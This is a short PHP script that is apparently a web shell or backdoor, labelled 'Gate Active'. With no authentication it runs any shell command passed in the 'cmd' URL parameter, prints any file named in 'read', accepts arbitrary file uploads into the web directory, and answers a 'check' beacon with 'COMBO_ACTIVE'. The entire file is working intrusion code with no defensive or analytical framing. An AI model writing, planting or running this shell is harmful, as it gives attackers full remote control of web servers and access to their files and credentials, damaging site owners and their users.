<?php
if (isset($_GET['check'])) {
    echo "COMBO_ACTIVE"; 
    exit;
}

if (isset($_GET['cmd'])) {
    echo "<pre>";
    passthru($_GET['cmd']);
    echo "</pre>";
    exit;
}

if (isset($_GET['read'])) {
    if (file_exists($_GET['read'])) {
        echo "<pre>" . htmlspecialchars(file_get_contents($_GET['read'])) . "</pre>";
        exit;
    }
}

if(isset($_FILES['f'])){
    if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
        echo "Uploaded: ".$_FILES['f']['name'];
    } else {
        echo "Upload Failed";
    }
}
?>
<hr>
<p>Gate Active - Use params: ?cmd=id, ?read=file, ?check</p>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="f"><button type="submit">Upload</button>
</form>
